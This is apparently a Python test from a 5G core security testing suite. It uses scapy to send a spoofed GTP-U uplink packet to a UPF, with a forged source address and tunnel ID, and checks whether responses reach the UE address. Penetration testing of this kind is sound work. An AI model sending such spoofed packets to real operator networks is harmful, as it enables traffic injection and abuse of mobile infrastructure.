from __future__ import annotations

from src.attacks.gtp_u.uplink_spoofing import gtp_uplink_packet
from src.utils.common import get_my_ip_from_prefix, ip_list

from scapy.all import send

def test_spoofing():
    
    # Send gtp uplink packet
    packet = gtp_uplink_packet(
        src_addr = "10.1.1.2", 
        dst_addr = ip_list["UPF"],
        tunnel_dst_addr = "google.com", # random address from internet
        ue_addr = get_my_ip_from_prefix(),
        teid = 1
    )
    send(packet)
    
    # by sniffing the network we should see a response that is directed to the UE IP address